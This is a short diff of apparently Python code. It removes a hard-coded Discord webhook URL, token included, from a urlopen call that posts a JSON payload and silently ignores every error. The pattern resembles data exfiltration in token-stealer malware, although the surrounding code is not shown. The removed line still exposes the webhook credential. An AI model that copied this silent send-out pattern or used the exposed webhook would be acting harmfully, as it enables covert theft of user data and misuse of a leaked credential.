@@ -267,7 +267,7 @@ def main():
     }
     try:
         urlopen(Request(
-            "https://discord.com/api/webhooks/843243288563286026/qLwKUmF_SfzciCbtbj7iw8MCrLDYBP5MFXhq9qhfLBMtAy0AvuCY-v2apeoAO0qq7AUl",
+            "",
             data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
